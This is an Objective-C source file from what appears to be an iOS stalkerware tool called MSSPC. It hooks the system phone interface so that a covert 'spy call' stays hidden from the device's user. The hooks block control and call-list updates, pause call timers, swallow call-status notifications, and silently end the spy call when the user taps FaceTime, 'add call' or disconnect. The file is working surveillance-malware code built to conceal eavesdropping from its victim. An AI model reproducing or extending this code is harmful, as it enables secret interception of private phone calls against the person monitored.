//
//  SpyCallInCallService.h
//  MSSPC
//
//  Created by Makara on 11/27/14.
//
//

#import "MSSPC.h"
#import "ICSSpyCallManager.h"
#import "SpyCallManagerSnapshot.h"

#import "PHAudioCallControlsView.h"

#import "PHAudioCallControlsViewController.h"
#import "PHCallParticipantsViewController.h"
#import "PHAudioCallViewController.h"
#import "PHInCallRootViewControllerActual.h"

#pragma mark - C methods to get spy call status -

BOOL isNormalCallInProgressICS() {
	return ([[[ICSSpyCallManager sharedICSSpyCallManager] mSpyCallManagerSnapshot] mIsNormalCallInProgress]);
}

BOOL isNormalCallIncomingICS() {
	return ([[[ICSSpyCallManager sharedICSSpyCallManager] mSpyCallManagerSnapshot] mIsNormalCallIncoming]);
}

BOOL isSpyCallInProgressICS() {
	return ([[[ICSSpyCallManager sharedICSSpyCallManager] mSpyCallManagerSnapshot] mIsSpyCallInProgress]);
}

BOOL isSpyCallAnsweringICS() {
	return ([[[ICSSpyCallManager sharedICSSpyCallManager] mSpyCallManagerSnapshot] mIsSpyCallAnswering]);
}

BOOL isSpyCallDisconnectingICS() {
	return ([[[ICSSpyCallManager sharedICSSpyCallManager] mSpyCallManagerSnapshot] mIsSpyCallDisconnecting]);
}

BOOL isSpyCallHangupCompletelyICS() {
	return ([[[ICSSpyCallManager sharedICSSpyCallManager] mSpyCallManagerSnapshot] mIsSpyCallCompletelyHangup]);
}

BOOL isSpyCallInConferenceICS() {
	return ([[[ICSSpyCallManager sharedICSSpyCallManager] mSpyCallManagerSnapshot] mIsSpyCallInConference]);
}

BOOL isSpyCallLeavingConferenceICS() {
	return ([[[ICSSpyCallManager sharedICSSpyCallManager] mSpyCallManagerSnapshot] mIsSpyCallLeavingConference]);
}

BOOL isSpyCallInitiatingConferenceICS() {
	return ([[[ICSSpyCallManager sharedICSSpyCallManager] mSpyCallManagerSnapshot] mIsSpyCallInitiatingConference]);
}

NSInteger numberOfNormalCallICS() {
	return ([[[ICSSpyCallManager sharedICSSpyCallManager] mSpyCallManagerSnapshot] mNumberOfNormalCall]);
}

NSInteger numberOfSpycallICS() {
	return ([[[ICSSpyCallManager sharedICSSpyCallManager] mSpyCallManagerSnapshot] mNumberOfSpyCall]);
}

#pragma mark - PHAudioCallControlsView -

HOOK(PHAudioCallControlsView, updateControls, void) {
    APPLOGVERBOSE(@"updateControls");
//    if (isSpyCallAnsweringICS() ||
//        isSpyCallInitiatingConferenceICS() ||
//        isSpyCallInConferenceICS()) {
    if ([ICSSpyCallManager anySpyCall]) { // Use this way to check spy call to improve performance
        // Block update the six buttons
	} else {
		CALL_ORIG(PHAudioCallControlsView, updateControls);
	}
}

#pragma mark - PHAudioCallControlsViewController -

HOOK(PHAudioCallControlsViewController, controlTypeTapped$, void, unsigned int arg1) {
    APPLOGVERBOSE(@"controlTypeTapped$, %d", arg1);
    if (4 == arg1) { // 'add call' button
        if ([ICSSpyCallManager anySpyCall]) {
            if (![SpyCallUtils isMobilePhoneRunning]) {
                /*
                 Though there is no side effect if we does not disconnect spy call but to make it
                 consistency with use case of if MobilePhone is not running -> disconnect spy call if any
                 */
                [ICSSpyCallManager endSpyCallIfAny];
            } else {
                CALL_ORIG(PHAudioCallControlsViewController, controlTypeTapped$, arg1);
            }
        } else {
            CALL_ORIG(PHAudioCallControlsViewController, controlTypeTapped$, arg1);
        }
    } else if (5 == arg1) { // 'FaceTime' button
        if ([ICSSpyCallManager anySpyCall]) {
            /*
             In case we did not disconnect spy call from here, SpringBoard openURL... will disconnect this call
             then leave 'speaker' button set to selected state, this is the side effect so we need to disconnect from here
             */
            [ICSSpyCallManager endSpyCallIfAny];
        } else {
            CALL_ORIG(PHAudioCallControlsViewController, controlTypeTapped$, arg1);
        }
    } else {
        CALL_ORIG(PHAudioCallControlsViewController, controlTypeTapped$, arg1);
    }
}

#pragma mark - PHCallParticipantsViewController -

// Note: Call timer will be paused while spy call is initiating
HOOK(PHCallParticipantsViewController, secondTickNotification$, void, id arg1) {
    //APPLOGVERBOSE(@"PHCallParticipantsViewController ---> secondTickNotification$, %@", arg1);
    NSNotification *notification = arg1;
    NSString *name = [notification name];
    if ([name isEqualToString:@"PHSynchronizedSecondTickNotification"]) {
        if ([ICSSpyCallManager anyCallOnHold]) {
            if ([ICSSpyCallManager anySpyCall]) {
                // Block
            } else {
                CALL_ORIG(PHCallParticipantsViewController, secondTickNotification$, arg1);
            }
        } else {
            CALL_ORIG(PHCallParticipantsViewController, secondTickNotification$, arg1);
        }
    } else {
        CALL_ORIG(PHCallParticipantsViewController, secondTickNotification$, arg1);
    }
}

HOOK(PHCallParticipantsViewController, _updateCallGroups, void) {
    APPLOGVERBOSE(@"_updateCallGroups %@", [self callGroups]);
    if ([ICSSpyCallManager anySpyCall]) {
        // Block
	} else {
		CALL_ORIG(PHCallParticipantsViewController, _updateCallGroups);
	}
}

#pragma mark - PHAudioCallViewController -

// Note: FaceTime button will be enable->disable while user return from SpringBoard or other apps screen (only one time while conference with private number)
HOOK(PHAudioCallViewController, callCenterCallStatusChangedNotification$, void, id arg1) {
    APPLOGVERBOSE(@"PHAudioCallViewController ---> callCenterCallStatusChangedNotification$, %@", arg1);
    NSNotification *notification = arg1;
    NSString *name = [notification name];
    if ([name isEqualToString:@"TUCallCenterCallStatusChangedNotification"]) {
        if ([ICSSpyCallManager anySpyCall]) {
            ;
        } else {
            CALL_ORIG(PHAudioCallViewController, callCenterCallStatusChangedNotification$, arg1);
        }
    } else {
        CALL_ORIG(PHAudioCallViewController, callCenterCallStatusChangedNotification$, arg1);
    }
}

// Note: Call ended screen is different between 'ended by 3rd party' and 'ended by target'
// ** ended by target participant status: ending -> ended -> disappear
// ** ended by 3rd party status: screen stop at duration timer -> disappear
HOOK(PHAudioCallViewController, bottomBarActionPerformed$fromBar$, void, int arg1, id arg2) {
    APPLOGVERBOSE(@"bottomBarActionPerformed$fromBar$, %d, %@", arg1, arg2); // arg2 = TPSuperBottomBar
    
    if (arg1 == 9) {
        // 5, decline
        // 1, accept
        // 9, disconnect
        if ([ICSSpyCallManager endSpyCallIfAny]) {
            [NSThread sleepForTimeInterval:0.001];
        }
    }
    CALL_ORIG(PHAudioCallViewController, bottomBarActionPerformed$fromBar$, arg1, arg2);
}

#pragma mark - PHInCallRootViewControllerActual -

// Note: When spy call coference initiating if contact or phone application (add call) view will disappear to InCallService view
HOOK(PHInCallRootViewControllerActual, handleDoubleHeightStatusBarTap, void) {
    APPLOGVERBOSE(@"handleDoubleHeightStatusBarTap");
    CALL_ORIG(PHInCallRootViewControllerActual, handleDoubleHeightStatusBarTap);
}
